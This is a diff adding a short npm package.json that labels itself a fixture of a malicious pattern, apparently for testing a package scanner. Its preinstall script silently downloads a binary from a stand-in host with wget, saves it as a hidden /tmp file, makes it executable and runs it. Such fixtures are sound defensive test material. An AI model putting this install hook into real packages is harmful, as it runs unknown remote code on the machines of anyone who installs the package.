@@ -1,0 +1,8 @@
+{
+  "name": "lwfx-wget-chmod-run",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): preinstall downloads a binary, marks it executable and runs it",
+  "scripts": {
+    "preinstall": "wget -q -O /tmp/.lwfx http://203.0.113.10/x && chmod +x /tmp/.lwfx && /tmp/.lwfx"
+  }
+}
